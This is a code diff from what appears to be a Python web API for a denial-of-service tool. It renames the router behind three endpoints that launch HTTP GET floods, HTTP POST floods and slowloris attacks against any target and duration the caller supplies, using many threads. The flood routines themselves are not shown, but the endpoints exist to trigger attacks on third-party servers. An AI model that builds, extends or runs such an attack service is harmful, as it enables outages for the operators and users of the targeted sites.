@@ -4,9 +4,9 @@ from globals import NUMBER_OF_THREADS
 from threading import Thread
 from log import log
 
-router = APIRouter()
+layer7_router = APIRouter()
 
-@router.post("/httpGETflood")
+@layer7_router.post("/httpGETflood")
 async def http_get_flood(time: int, target: str, request: Request):
     try:
         for i in range(NUMBER_OF_THREADS):
@@ -16,7 +16,7 @@ async def http_get_flood(time: int, target: str, request: Request):
     except:
         log.warning(f"{target} HTTP-GET-FLood from {request.client.host} for {time} seconds could not be triggered")
 
-@router.post("/httpPOSTflood")
+@layer7_router.post("/httpPOSTflood")
 async def http_post_flood(time: int, target: str, payload: str, request: Request):
     try:
         for i in range(NUMBER_OF_THREADS):
@@ -26,7 +26,7 @@ async def http_post_flood(time: int, target: str, payload: str, request: Request
     except:
         log.warning(f"{target} HTTP-POST-FLood from {request.client.host} for {time} seconds could not be triggered")
 
-@router.post("/slowloris")
+@layer7_router.post("/slowloris")
 async def slow_loris(target: str, port: int, time: int, request: Request):
     try:
         Layer7.slow_loris(target, port, time)
